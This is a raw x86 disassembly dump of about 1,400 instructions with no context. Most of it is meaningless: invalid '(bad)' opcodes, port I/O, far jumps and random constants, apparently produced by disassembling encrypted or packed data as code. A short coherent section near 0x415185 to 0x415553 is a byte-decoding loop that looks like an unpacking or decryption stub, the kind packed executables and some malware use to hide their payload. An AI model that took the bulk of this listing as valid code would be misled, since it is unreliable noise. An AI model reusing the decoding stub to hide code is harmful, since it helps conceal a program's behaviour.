  414f2d:	mov    gs,WORD PTR [ebx]
  414f2f:	cwde   
  414f30:	sbb    esi,edx
  414f32:	sbb    eax,0x8386ec88
  414f37:	call   0x87dd2577
  414f3c:	mov    bh,0xb0
  414f3e:	push   esp
  414f3f:	js     0x414ec3
  414f41:	fsubr  QWORD PTR [ecx-0x69695f66]
  414f47:	dec    ecx
  414f48:	fisub  WORD PTR [edi+ebx*4-0x7459ab50]
  414f4f:	jmp    0xf626d97d
  414f54:	cmc    
  414f55:	push   eax
  414f56:	mov    ch,0x75
  414f58:	ss push ecx
  414f5a:	xor    bh,dh
  414f5c:	fdivr  st,st(0)
  414f5e:	mov    ds:0x1d26ff1d,eax
  414f63:	shl    BYTE PTR [edx+0x61b14600],0x82
  414f6a:	(bad)  
  414f6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f6c:	push   esp
  414f6d:	pop    ebp
  414f6e:	lock int3 
  414f70:	mov    ch,0x47
  414f72:	in     eax,dx
  414f73:	xor    eax,0x8b91c574
  414f78:	repz in al,dx
  414f7a:	lods   al,BYTE PTR ds:[esi]
  414f7b:	mov    dl,0x6e
  414f7d:	mov    ch,BYTE PTR [eax]
  414f7f:	out    0xca,al
  414f81:	dec    eax
  414f82:	inc    esp
  414f83:	loop   0x414fba
  414f85:	push   0xfa87defe
  414f8a:	mov    ebx,0x9be1fc98
  414f8f:	mov    DWORD PTR [ecx-0x18522b00],edx
  414f95:	sar    BYTE PTR [ebx],0x83
  414f98:	pop    edi
  414f99:	fcmovnbe st,st(3)
  414f9b:	cmp    BYTE PTR [edx+0x3d],dl
  414f9e:	sbb    DWORD PTR [ecx+ebp*2-0x7dffdb08],esp
  414fa5:	std    
  414fa6:	xor    al,0x15
  414fa8:	jmp    0xf47d:0x1aa9ba37
  414faf:	pop    edx
  414fb0:	lock mov BYTE PTR [eax-0x2d],dl
  414fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fb5:	sub    bh,0x9c
  414fb8:	push   0xefd69c72
  414fbd:	sub    edi,ebx
  414fbf:	lds    ebp,FWORD PTR [ecx+0x5ad0eab0]
  414fc5:	sub    eax,0x9e107f0
  414fca:	into   
  414fcb:	lock or DWORD PTR [ecx],0x534dc058
  414fd2:	ret    0x599a
  414fd5:	mov    ebp,0x9dc780b5
  414fda:	mov    cl,0x79
  414fdc:	pop    edx
  414fdd:	dec    eax
  414fde:	push   0x41c1557a
  414fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fe4:	imul   edi,DWORD PTR [ebp-0x8a82a3d],0x120607d5
  414fee:	and    al,0x5f
  414ff0:	sti    
  414ff1:	cmp    BYTE PTR [ecx-0x1f],0x6
  414ff5:	add    bh,BYTE PTR [eax-0x2c55c48f]
  414ffb:	sbb    eax,0x20c3a878
  415000:	popf   
  415001:	enter  0xe546,0xdf
  415005:	mov    eax,ds:0xbcc9c85d
  41500a:	fild   WORD PTR [edi+eiz*1]
  41500d:	cmp    al,0x60
  41500f:	mov    cl,0xa4
  415011:	seto   BYTE PTR [eax-0x4d874c59]
  415018:	xor    al,BYTE PTR [ecx-0x2e83e562]
  41501e:	stc    
  41501f:	mov    eax,ds:0xe560de05
  415024:	mov    ch,0xe5
  415026:	mov    dl,0xc8
  415028:	jo     0x415024
  41502a:	pop    esp
  41502b:	push   0xea7f7d6c
  415030:	xor    DWORD PTR [esi+0x3fc4af80],esi
  415036:	cmp    BYTE PTR [ecx+0x3c],bl
  415039:	in     al,0xfc
  41503b:	stos   BYTE PTR es:[edi],al
  41503c:	dec    ebp
  41503d:	je     0x415042
  41503f:	call   0x87edf1ad
  415044:	inc    dx
  415046:	cmp    al,0xc3
  415048:	pop    ecx
  415049:	mov    dh,0x5d
  41504b:	sub    DWORD PTR ds:0xa32ce3ae,ebp
  415051:	test   DWORD PTR [ebx],esi
  415053:	mov    WORD PTR [ebx+0x2a],cs
  415056:	jl     0x415051
  415058:	sbb    DWORD PTR [eax-0x5cbb338f],ebp
  41505e:	dec    ecx
  41505f:	pop    esi
  415060:	cmp    eax,DWORD PTR [ecx+0x9637082]
  415066:	xchg   DWORD PTR [edi+0x71d95a4c],ecx
  41506c:	enter  0x4fb2,0xfd
  415070:	sub    al,0xd5
  415072:	inc    ebp
  415073:	sub    cl,BYTE PTR [edx+0xad4a9dd]
  415079:	inc    ecx
  41507a:	jl     0x415040
  41507c:	dec    edi
  41507d:	xlat   BYTE PTR ds:[ebx]
  41507e:	jmp    0x38a91845
  415083:	lahf   
  415084:	in     al,dx
  415085:	pop    edx
  415086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415087:	cs cmp al,0x2
  41508a:	xchg   BYTE PTR [eax-0x652da888],bl
  415090:	mov    ss,WORD PTR [esi+0x32cb3769]
  415096:	sbb    al,0x73
  415098:	jl     0x415034
  41509a:	retf   
  41509b:	pop    esi
  41509c:	sbb    eax,0x5f3c3e51
  4150a1:	pop    ecx
  4150a2:	xchg   ebx,eax
  4150a3:	outs   dx,DWORD PTR ds:[esi]
  4150a4:	jmp    0xf89e9d66
  4150a9:	mov    cl,0x14
  4150ab:	scas   eax,DWORD PTR es:[edi]
  4150ac:	mov    cl,0x68
  4150ae:	sbb    edx,eax
  4150b0:	loop   0x415045
  4150b2:	mov    cl,0x84
  4150b4:	jl     0x415089
  4150b6:	dec    esi
  4150b7:	les    ebp,FWORD PTR [eax]
  4150b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ba:	(bad)  
  4150bb:	cmp    bl,ch
  4150bd:	test   DWORD PTR [ecx-0x1c],eax
  4150c0:	ins    DWORD PTR es:[edi],dx
  4150c1:	(bad)  
  4150c2:	mov    ah,0xc
  4150c4:	jge    0x41510a
  4150c6:	push   es
  4150c7:	xchg   DWORD PTR [eax+ecx*2-0x53],eax
  4150cb:	inc    esp
  4150cc:	adc    ecx,ebp
  4150ce:	fucomip st,st(1)
  4150d0:	adc    al,0xe
  4150d2:	fisttp QWORD PTR [ebx+0x7ceea8c3]
  4150d8:	lods   eax,DWORD PTR ds:[esi]
  4150d9:	jmp    0x86fa:0x6d866027
  4150e0:	ss pop esi
  4150e2:	fldcw  WORD PTR [esi]
  4150e4:	mov    WORD PTR [eax-0x29],gs
  4150e7:	add    al,BYTE PTR [ebx-0x5ebaabcf]
  4150ed:	sar    DWORD PTR [ecx],cl
  4150ef:	sub    bh,BYTE PTR [ebp-0x7d5470c4]
  4150f5:	and    edx,eax
  4150f7:	enter  0xee52,0xd4
  4150fb:	dec    ebx
  4150fc:	dec    ebp
  4150fd:	jae    0x4150c8
  4150ff:	rcl    dh,0x46
  415102:	test   esp,eax
  415104:	out    dx,al
  415105:	jae    0x41515d
  415107:	xchg   esp,eax
  415108:	mov    eax,ds:0x901eba59
  41510d:	test   al,0xb9
  41510f:	retf   0xee7e
  415112:	pop    esp
  415113:	jecxz  0x415169
  415115:	mov    eax,ds:0xdfece919
  41511a:	pop    eax
  41511b:	push   esp
  41511c:	cmp    cl,dl
  41511e:	frstor [ecx]
  415120:	mov    DWORD PTR [eax-0x66],esp
  415123:	cmc    
  415124:	push   es
  415125:	sub    al,0xad
  415127:	mov    dl,BYTE PTR [eax-0x199ead73]
  41512d:	sbb    bl,dl
  41512f:	inc    ebp
  415130:	idiv   DWORD PTR [eax+0x67837b05]
  415136:	call   0x16fb:0xb903db5
  41513d:	shl    BYTE PTR [edx+0x2b],0x4d
  415141:	xchg   ecx,eax
  415142:	mov    bl,0x74
  415144:	add    eax,0xca12042
  415149:	cmp    al,0xe3
  41514b:	test   BYTE PTR [edx],dh
  41514d:	cmp    al,0x1e
  41514f:	jo     0x41517b
  415151:	pop    ds
  415152:	mov    bh,0x85
  415154:	shl    ch,0x78
  415157:	ja     0x4151af
  415159:	xchg   esp,eax
  41515a:	rcr    BYTE PTR [edi+0x39],cl
  41515d:	adc    bl,BYTE PTR [eax-0x7]
  415160:	popf   
  415161:	add    eax,0xdd9ed418
  415166:	cmp    BYTE PTR [esi+0x37],dh
  415169:	shl    DWORD PTR [ebp+0xe73635d],0xe5
  415170:	adc    bl,BYTE PTR [bx+si-0x32ad]
  415175:	jl     0x4150ff
  415177:	pushf  
  415178:	sub    al,0xb0
  41517a:	sub    eax,0xffa36e89
  41517f:	je     0x41592b
  415185:	mov    DWORD PTR [ebp-0x18],0x1001
  41518c:	mov    edx,DWORD PTR [ebp-0x1c]
  41518f:	xor    ecx,ecx
  415191:	test   edx,edx
  415193:	jmp    0x4154cc
  415198:	jno    0x4151dd
  41519a:	mov    edx,0xb9bcbc52
  41519f:	fs inc eax
  4151a1:	sub    BYTE PTR [edx],bh
  4151a3:	xchg   edx,eax
  4151a4:	jmp    0xbeb0:0x3ccfee08
  4151ab:	mov    esi,0xbebec4ed
  4151b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151b1:	aam    0x85
  4151b3:	ret    
  4151b4:	ja     0x4151c5
  4151b6:	and    eax,0x9a16bd13
  4151bb:	pop    ss
  4151bc:	mov    eax,0xd459c949
  4151c1:	jnp    0x415144
  4151c3:	dec    ecx
  4151c4:	and    BYTE PTR [edi],ch
  4151c6:	test   al,0x3f
  4151c8:	inc    edi
  4151c9:	and    eax,0xec318c4d
  4151ce:	mov    ecx,0x4e6c21ec
  4151d3:	mov    bh,0x15
  4151d5:	inc    esi
  4151d6:	sub    BYTE PTR [edi-0x6ddcbd7e],ah
  4151dc:	(bad)  
  4151dd:	xor    BYTE PTR [esi-0x3bd62bfb],bh
  4151e3:	pop    ecx
  4151e4:	cdq    
  4151e5:	jge    0x415229
  4151e7:	add    BYTE PTR [ebp-0x29],dl
  4151ea:	in     al,0x98
  4151ec:	jmp    0x415191
  4151ee:	daa    
  4151ef:	push   0xffffffe5
  4151f1:	lods   al,BYTE PTR ds:[esi]
  4151f2:	rcr    DWORD PTR [ebx],cl
  4151f4:	rcr    DWORD PTR [ecx-0x77],0xcf
  4151f8:	and    al,0xec
  4151fa:	dec    eax
  4151fb:	jo     0x415209
  4151fd:	ret    
  4151fe:	nop
  4151ff:	mov    ah,0x3a
  415201:	pop    esp
  415202:	std    
  415203:	jmp    0xcfc:0x3cec3156
  41520a:	mov    al,0x4b
  41520c:	fisubr DWORD PTR [edx-0x561ddad8]
  415212:	enter  0xb4f9,0x15
  415216:	mov    al,0x2
  415218:	dec    edx
  415219:	and    edx,ebp
  41521b:	mov    cl,0xc1
  41521d:	js     0x4151e3
  41521f:	scas   eax,DWORD PTR es:[edi]
  415220:	xchg   ebp,eax
  415221:	(bad)  
  415222:	aad    0xdc
  415224:	dec    esp
  415225:	sar    edi,cl
  415227:	loop   0x415290
  415229:	mov    ds:0x459ac60d,eax
  41522e:	clc    
  41522f:	jbe    0x41529d
  415231:	and    bh,dh
  415233:	push   edx
  415234:	and    BYTE PTR [edi+eax*4],dh
  415237:	adc    BYTE PTR [eax+ecx*1+0x71],0xf9
  41523c:	mov    esi,DWORD PTR ds:0x16815082
  415242:	pushf  
  415243:	das    
  415244:	xor    ah,ah
  415246:	lahf   
  415247:	pop    ds
  415248:	pop    ebp
  415249:	cmp    BYTE PTR [edx-0x10575a19],al
  41524f:	or     bh,BYTE PTR [esp+0x4be2f19f]
  415256:	mov    eax,0x5131597a
  41525b:	dec    esp
  41525c:	rcr    BYTE PTR [edi+0x32f6085],cl
  415262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415263:	sub    eax,0x7a4da3c4
  415268:	je     0x415247
  41526a:	pusha  
  41526b:	ret    0xdede
  41526e:	push   0x3f1db1e3
  415273:	imul   DWORD PTR [esi+edx*1]
  415276:	jae    0x4152a4
  415278:	stos   DWORD PTR es:[edi],eax
  415279:	ins    BYTE PTR es:[edi],dx
  41527a:	xor    ebx,ecx
  41527c:	xor    BYTE PTR [ebx-0x246bdaec],0xb0
  415283:	cmp    BYTE PTR [esi+eax*8-0x49],0x75
  415288:	adc    ebp,ebx
  41528a:	adc    dh,BYTE PTR [esi]
  41528c:	adc    WORD PTR [edx+0x71c1a1c0],cx
  415293:	dec    DWORD PTR [ebx-0x49edbe99]
  415299:	lds    eax,FWORD PTR [edx-0x3eec4441]
  41529f:	cs push ecx
  4152a1:	pop    ss
  4152a2:	stos   DWORD PTR es:[edi],eax
  4152a3:	and    eax,0x47c129a7
  4152a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152a9:	ja     0x415294
  4152ab:	in     eax,dx
  4152ac:	jne    0x415319
  4152ae:	dec    ebp
  4152af:	push   ss
  4152b0:	scas   eax,DWORD PTR es:[edi]
  4152b1:	mov    ch,ch
  4152b3:	ss mov ah,0xa8
  4152b6:	or     ecx,0x3efef9f
  4152bc:	add    eax,0x88e7f4
  4152c1:	(bad)  
  4152c2:	retf   
  4152c3:	pusha  
  4152c4:	xor    BYTE PTR [ebx+ecx*8],cl
  4152c7:	ss sub dl,0x1c
  4152cb:	dec    edi
  4152cc:	dec    ecx
  4152cd:	(bad)  
  4152ce:	adc    eax,0x2cfd66fa
  4152d3:	call   0x950b:0xeca6f4df
  4152da:	and    dl,BYTE PTR [edx]
  4152dc:	out    0x96,eax
  4152de:	add    al,0x8b
  4152e0:	inc    esp
  4152e1:	test   eax,0xb76e3aae
  4152e6:	das    
  4152e7:	inc    eax
  4152e8:	sub    al,0x8
  4152ea:	sahf   
  4152eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ec:	mov    ebx,0x58235df6
  4152f1:	gs dec esi
  4152f3:	jge    0x4152ad
  4152f5:	in     al,0xbd
  4152f7:	and    ecx,DWORD PTR [esi]
  4152f9:	fisttp DWORD PTR [ecx-0xa]
  4152fc:	xor    BYTE PTR [ebp+0x53ee9008],ch
  415302:	jge    0x4152bc
  415304:	fcmovnu st,st(2)
  415306:	and    eax,0x8b1b48c0
  41530b:	fistp  WORD PTR [ecx-0x60]
  41530e:	xchg   ebx,eax
  41530f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415310:	add    esp,DWORD PTR [ecx]
  415312:	out    dx,al
  415313:	adc    BYTE PTR [edx*4+0xa8b06b6],al
  41531a:	mov    ah,0xbf
  41531c:	adc    BYTE PTR ds:0xa4f35f3d,dl
  415322:	mov    ah,0x7f
  415324:	loop   0x4152cf
  415326:	sbb    al,0xa
  415328:	nop
  415329:	(bad)  
  41532a:	jns    0x41533e
  41532c:	int3   
  41532d:	mov    edx,0xe19775b6
  415332:	mov    cl,0xaa
  415334:	add    DWORD PTR [eax],0xe7455eb7
  41533a:	fisttp QWORD PTR [ebx+edx*1]
  41533d:	mov    al,0x47
  41533f:	(bad)  
  415340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415341:	inc    ecx
  415342:	retf   
  415343:	ja     0x415364
  415345:	iret   
  415346:	rcr    ch,cl
  415348:	push   ecx
  415349:	scas   al,BYTE PTR es:[edi]
  41534a:	stc    
  41534b:	enter  0xeaaf,0x83
  41534f:	jns    0x415379
  415351:	bnd je 0x415387
  415354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415355:	jb     0x4153ab
  415357:	ss retf 0xb47a
  41535b:	out    0xee,al
  41535d:	adc    ebx,DWORD PTR [edi]
  41535f:	icebp  
  415360:	ja     0x4152e9
  415362:	stc    
  415363:	pop    ecx
  415364:	cdq    
  415365:	scas   eax,DWORD PTR es:[edi]
  415366:	xchg   ecx,eax
  415367:	test   DWORD PTR [edi-0x2c8ec3cc],esi
  41536d:	ins    BYTE PTR es:[edi],dx
  41536e:	hlt    
  41536f:	mov    ecx,0x2fe88b6f
  415374:	mov    DWORD PTR [edx+0x50],edx
  415377:	or     al,0x58
  415379:	add    esi,DWORD PTR [ebx+0xa]
  41537c:	and    esi,DWORD PTR [esi+0x4b405ef1]
  415382:	loope  0x4153fd
  415384:	pop    edi
  415385:	xor    eax,0x78b788ab
  41538a:	inc    ebp
  41538b:	add    BYTE PTR [edi-0x78],ah
  41538e:	fisub  DWORD PTR es:[ebx+edi*4]
  415392:	xchg   edx,eax
  415393:	fsubr  DWORD PTR [ecx]
  415395:	aas    
  415396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415397:	sbb    eax,0xeacf7db0
  41539c:	dec    ecx
  41539d:	imul   BYTE PTR [eax-0x16]
  4153a0:	sub    eax,ebx
  4153a2:	and    bh,BYTE PTR [edx+0x2b058b0f]
  4153a8:	ja     0x415395
  4153aa:	push   ecx
  4153ab:	out    dx,eax
  4153ac:	loope  0x415334
  4153ae:	mov    al,0x2
  4153b0:	int    0xa8
  4153b2:	scas   eax,DWORD PTR es:[edi]
  4153b3:	push   0xbcaae17a
  4153b8:	xor    esi,edi
  4153ba:	cmp    edi,ecx
  4153bc:	jns    0x4153a0
  4153be:	xor    DWORD PTR [ebp-0x5c],edx
  4153c1:	xor    eax,0x30437b6c
  4153c6:	lahf   
  4153c7:	ja     0x4153e9
  4153c9:	cmp    ebp,esi
  4153cb:	mov    eax,ds:0xf790a4b5
  4153d0:	cmp    eax,0xc0e589b9
  4153d5:	div    DWORD PTR [ebp+0x2e8f5898]
  4153db:	mov    dh,0x99
  4153dd:	cmp    ah,BYTE PTR [eax]
  4153df:	stos   DWORD PTR es:[edi],eax
  4153e0:	jns    0x415439
  4153e2:	jp     0x41536d
  4153e4:	xchg   ebp,eax
  4153e5:	dec    ebp
  4153e6:	int    0xf6
  4153e8:	or     dl,BYTE PTR [ebx+ebx*2-0x3d]
  4153ec:	test   eax,0x66e1d4ab
  4153f1:	xlat   BYTE PTR ds:[ebx]
  4153f2:	sbb    DWORD PTR [edx+0x2],ebx
  4153f5:	pop    ss
  4153f6:	xor    DWORD PTR [edx-0x23],0x56d5829a
  4153fd:	or     dl,BYTE PTR [edx+0xb]
  415400:	push   esi
  415401:	mov    esi,0xe4801742
  415406:	jne    0x4153a3
  415408:	jbe    0x4153ed
  41540a:	sbb    al,0xd9
  41540c:	adc    BYTE PTR [ecx+0x69],0x4c
  415410:	cmp    eax,0x5479dbaa
  415415:	out    0x6a,eax
  415417:	mov    WORD PTR ss:[edx-0x34],?
  41541b:	sub    BYTE PTR [edx],dl
  41541d:	popf   
  41541e:	and    ebx,DWORD PTR [ebp-0x63d77665]
  415424:	lahf   
  415425:	mov    esp,0x194f9867
  41542a:	das    
  41542b:	or     al,0xe5
  41542d:	sbb    al,0x40
  41542f:	stc    
  415430:	adc    eax,0x7c8a0165
  415435:	sahf   
  415436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415437:	jle    0x415445
  415439:	pop    edi
  41543a:	mov    ebx,0xbf81e8f2
  41543f:	or     al,0x51
  415441:	jp     0x415410
  415443:	enter  0x93fe,0x48
  415447:	mov    fs,WORD PTR [eax]
  415449:	pusha  
  41544a:	cmp    BYTE PTR [ebx],dl
  41544c:	and    ebp,DWORD PTR [eax+0x57]
  41544f:	add    DWORD PTR [eax+edi*4+0x65],ebx
  415453:	xchg   ebx,eax
  415454:	(bad)  
  415455:	lea    ecx,[edx]
  415457:	fucomi st,st(5)
  415459:	retf   0xb915
  41545c:	push   0x16b7369e
  415461:	mov    esi,0xfbd396d7
  415466:	(bad)  
  415467:	bound  esp,QWORD PTR [edi]
  415469:	pop    eax
  41546a:	or     dh,BYTE PTR [edx]
  41546c:	jle    0x4154d0
  41546e:	mov    DWORD PTR [edi+0x51],esp
  415471:	hlt    
  415472:	test   BYTE PTR [ecx+0x23],bh
  415475:	dec    edi
  415476:	mov    eax,0x8709cf12
  41547b:	(bad)  
  41547c:	jnp    0x41540b
  41547e:	inc    ebp
  41547f:	fist   DWORD PTR [ecx]
  415481:	pop    edi
  415482:	gs mov al,0x27
  415485:	sbb    al,0xc9
  415487:	adc    bl,BYTE PTR [esi+0x7a]
  41548a:	pop    ebx
  41548b:	stos   DWORD PTR es:[edi],eax
  41548c:	add    ch,BYTE PTR [esp+ecx*4+0x244a6feb]
  415493:	jp     0x4154f8
  415495:	cwde   
  415496:	adc    eax,0xa07f9b70
  41549b:	fadd   QWORD PTR [edi+0x55]
  41549e:	repz sahf 
  4154a0:	dec    ecx
  4154a1:	enter  0xbf11,0x6a
  4154a5:	out    0x3c,eax
  4154a7:	sbb    dh,BYTE PTR [ebp+esi*1-0x42]
  4154ab:	xchg   DWORD PTR [ebx-0x5f],ebx
  4154ae:	enter  0x9bf1,0x86
  4154b2:	xchg   edx,eax
  4154b3:	push   ecx
  4154b4:	push   es
  4154b5:	sub    cl,bh
  4154b7:	test   BYTE PTR [edi],dl
  4154b9:	(bad)  
  4154ba:	rol    BYTE PTR [eax+eiz*1+0x584a95e7],1
  4154c1:	jb     0x4154e6
  4154c3:	sub    al,0xe
  4154c5:	jg     0x4154d9
  4154c7:	in     eax,dx
  4154c8:	retf   
  4154c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ca:	adc    eax,0x7e840f89
  4154cf:	add    BYTE PTR [eax],al
  4154d1:	add    BYTE PTR [edx+0x45883904],cl
  4154d7:	inc    esi
  4154d9:	inc    ebp
  4154da:	std    
  4154db:	je     0x4154a3
  4154dd:	inc    ebp
  4154de:	(bad)  
  4154df:	push   ss
  4154e0:	mov    BYTE PTR [ebp-0x4],0x62
  4154e4:	movzx  eax,BYTE PTR [ebp-0x4]
  4154e8:	movzx  ebx,BYTE PTR [ebp-0x2]
  4154ec:	or     eax,0xd4
  4154f1:	and    eax,ebx
  4154f3:	movzx  ebx,BYTE PTR [ebp-0x3]
  4154f7:	and    eax,ebx
  4154f9:	mov    BYTE PTR [ebp-0x12],al
  4154fc:	mov    BYTE PTR [ebp-0x11],0xfe
  415500:	mov    BYTE PTR [ebp-0x14],0x32
  415504:	mov    BYTE PTR [ebp-0x4],0xc7
  415508:	mov    BYTE PTR [ebp-0x2],0x73
  41550c:	mov    BYTE PTR [ebp-0x3],0xb3
  415510:	mov    al,BYTE PTR [ebp-0x3]
  415513:	mov    bl,BYTE PTR [ebp-0x2]
  415516:	or     al,bl
  415518:	mov    bl,BYTE PTR [ebp-0x4]
  41551b:	sub    al,bl
  41551d:	mov    bl,BYTE PTR [ebp-0x14]
  415520:	imul   bl
  415522:	mov    bl,BYTE PTR [ebp-0x11]
  415525:	sub    al,bl
  415527:	mov    bl,BYTE PTR [ebp-0x12]
  41552a:	cmp    bl,al
  41552c:	ja     0x415541
  415532:	movzx  eax,BYTE PTR [ebp-0x1]
  415536:	sub    eax,0xed
  41553b:	mov    BYTE PTR [ebp-0x1],al
  41553e:	ror    BYTE PTR [ebp-0x1],1
  415541:	mov    al,BYTE PTR [ebp-0x1]
  415544:	mov    BYTE PTR [ecx+edi*1],al
  415547:	inc    ecx
  415548:	cmp    ecx,edx
  41554a:	jb     0x4154d2
  415550:	dec    DWORD PTR [ebp-0x18]
  415553:	jne    0x41518c
  415559:	mov    eax,DWORD PTR [ebp+0x8]
  41555c:	mov    ecx,DWORD PTR [ebp+0xc]
  41555f:	shrd   eax,ecx,0x2
  415563:	shr    ecx,0x2
  415566:	mov    ecx,DWORD PTR [ebp+0x8]
  415569:	mov    edx,DWORD PTR [ebp+0xc]
  41556c:	xor    eax,esi
  41556e:	xor    edx,edx
  415570:	jmp    0x4158a9
  415575:	cmp    dl,BYTE PTR [ebx]
  415577:	inc    esi
  415578:	mov    WORD PTR [eax-0x64],gs
  41557b:	cmp    al,0xb3
  41557d:	mov    ch,0xd8
  41557f:	(bad)  
  415580:	(bad)  
  415582:	jbe    0x4155de
  415584:	shr    DWORD PTR [esi+esi*4-0x42],1
  415588:	mov    esi,0xbebec4ed
  41558d:	ds cwde 
  41558f:	aaa    
  415590:	fld    DWORD PTR [ecx-0x4969dbb5]
  415596:	ror    BYTE PTR [ebp+0x9],0x20
  41559a:	sahf   
  41559b:	pop    ebp
  41559c:	pop    edi
  41559d:	call   0x6a8ca072
  4155a2:	cmp    ebx,eax
  4155a4:	stos   DWORD PTR es:[edi],eax
  4155a5:	scas   eax,DWORD PTR es:[edi]
  4155a6:	lods   al,BYTE PTR ds:[esi]
  4155a7:	cli    
  4155a8:	sar    DWORD PTR [ebp-0x7af07e76],0xaa
  4155af:	xchg   BYTE PTR [ebp+0x727e29f2],bl
  4155b5:	pop    eax
  4155b6:	mov    esi,0x774569fa
  4155bb:	stos   DWORD PTR es:[edi],eax
  4155bc:	mov    edx,0xd746f539
  4155c1:	test   DWORD PTR ds:0xf31b2950,edi
  4155c7:	fcomp  DWORD PTR [ecx]
  4155c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ca:	loope  0x41554f
  4155cc:	adc    eax,0x70c1ec6d
  4155d1:	inc    ebp
  4155d2:	sbb    eax,0x6a988277
  4155d7:	xchg   BYTE PTR [edx+edx*8],ch
  4155da:	inc    ecx
  4155db:	mov    cl,0x93
  4155dd:	inc    esp
  4155de:	or     al,0xc
  4155e0:	in     eax,0x19
  4155e2:	inc    esi
  4155e3:	fndisi(8087 only) 
  4155e5:	je     0x4155c6
  4155e7:	inc    ebx
  4155e8:	retf   
  4155e9:	or     DWORD PTR ds:0x703877a5,esi
  4155ef:	mov    esi,DWORD PTR [edi-0x6e]
  4155f2:	ret    
  4155f3:	adc    al,0x56
  4155f5:	inc    esi
  4155f6:	fistp  QWORD PTR [ebx-0x75]
  4155f9:	outs   dx,BYTE PTR ds:[esi]
  4155fa:	lods   al,BYTE PTR ds:[esi]
  4155fb:	out    0xa5,al
  4155fd:	push   cs
  4155fe:	push   ebp
  4155ff:	in     al,dx
  415600:	icebp  
  415601:	scas   al,BYTE PTR es:[edi]
  415602:	rcr    DWORD PTR [eax+esi*4-0x41075bd7],cl
  415609:	dec    eax
  41560a:	xchg   ecx,eax
  41560b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41560d:	mov    esi,eax
  41560f:	shl    esp,0x14
  415612:	out    0x48,eax
  415614:	cld    
  415615:	push   cs
  415616:	sbb    al,0xbb
  415618:	ret    0xfb4e
  41561b:	cli    
  41561c:	clc    
  41561d:	jle    0x41563b
  41561f:	jg     0x4155b9
  415621:	out    dx,al
  415622:	xchg   edx,eax
  415623:	push   ss
  415624:	out    0x6d,al
  415626:	or     ch,dl
  415628:	in     al,dx
  415629:	mov    edi,0xe9ec2ed
  41562e:	dec    ebx
  41562f:	int3   
  415630:	push   es
  415631:	into   
  415632:	xlat   BYTE PTR ds:[ebx]
  415633:	stc    
  415634:	mul    BYTE PTR [esi]
  415636:	test   eax,0x63aeeb9f
  41563b:	dec    edx
  41563c:	jge    0x41568d
  41563e:	cmp    BYTE PTR [eax+0x555848e8],ch
  415644:	dec    esi
  415645:	push   esi
  415646:	lods   al,BYTE PTR ds:[esi]
  415647:	sti    
  415648:	sub    dl,dh
  41564a:	sub    eax,0xf2d10ef3
  41564f:	popa   
  415650:	dec    esp
  415651:	pop    ds
  415652:	out    dx,al
  415653:	int3   
  415654:	pop    ebx
  415655:	jp     0x41561f
  415657:	push   edx
  415658:	nop
  415659:	stc    
  41565a:	inc    eax
  41565b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565c:	fst    DWORD PTR [edi-0x45]
  41565f:	sub    esi,edx
  415661:	xchg   ebx,eax
  415662:	and    BYTE PTR [edi+0x3b683b51],al
  415668:	xor    bl,al
  41566a:	jo     0x415647
  41566c:	cld    
  41566d:	imul   esp,DWORD PTR fs:[ebp+0x49],0x4
  415672:	mov    ecx,0x2aad9d0e
  415677:	pusha  
  415678:	fistp  WORD PTR [ebx]
  41567a:	dec    edi
  41567b:	push   ebp
  41567c:	sahf   
  41567d:	sub    al,0xb8
  41567f:	jmp    0x41568a
  415681:	jg     0x4156f1
  415683:	popf   
  415684:	push   ebx
  415685:	outs   dx,BYTE PTR ds:[esi]
  415686:	test   al,0x74
  415688:	dec    ecx
  415689:	mov    ds:0xec9caca1,eax
  41568e:	lahf   
  41568f:	mov    edx,cs
  415691:	hlt    
  415692:	call   0x6d1ee401
  415697:	popf   
  415698:	mov    edx,0x3ca477b4
  41569d:	cmp    DWORD PTR [esp+eiz*4+0x72f0e942],ebp
  4156a4:	pop    esp
  4156a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a6:	xor    ah,BYTE PTR [edi-0x3ac2b1cb]
  4156ac:	arpl   WORD PTR [ebp-0x7163d9c9],bp
  4156b2:	add    al,ah
  4156b4:	cmp    edi,esp
  4156b6:	dec    esp
  4156b7:	push   cs
  4156b8:	jecxz  0x415671
  4156ba:	push   edx
  4156bb:	fwait
  4156bc:	aaa    
  4156bd:	sbb    DWORD PTR cs:[ecx],ebp
  4156c0:	xor    BYTE PTR [esp+ecx*1-0x26],ah
  4156c4:	add    al,0xc0
  4156c6:	inc    ecx
  4156c7:	dec    eax
  4156c8:	les    ebp,FWORD PTR [ecx+0x47]
  4156cb:	push   eax
  4156cc:	mov    fs,WORD PTR [ebp+0x482d3612]
  4156d2:	sub    eax,DWORD PTR [ebx+eax*1-0x64]
  4156d6:	push   es
  4156d7:	div    edi
  4156d9:	popf   
  4156da:	aad    0xd9
  4156dc:	fidivr DWORD PTR [ecx]
  4156de:	mov    esp,esi
  4156e0:	in     eax,0x1d
  4156e2:	mov    cl,0xe7
  4156e4:	fnsave [edi-0x2b7facaf]
  4156ea:	icebp  
  4156eb:	xor    BYTE PTR [ecx+ecx*2+0x2f211223],bh
  4156f2:	and    edi,DWORD PTR ds:0xf5ecd99e
  4156f8:	jmp    0x574e:0x6ab4f7ed
  4156ff:	(bad)  [ebx+ebp*8+0x10]
  415703:	jne    0x4156dc
  415705:	xor    al,0x93
  415707:	adc    eax,0x666fd776
  41570c:	ins    DWORD PTR es:[edi],dx
  41570d:	js     0x415741
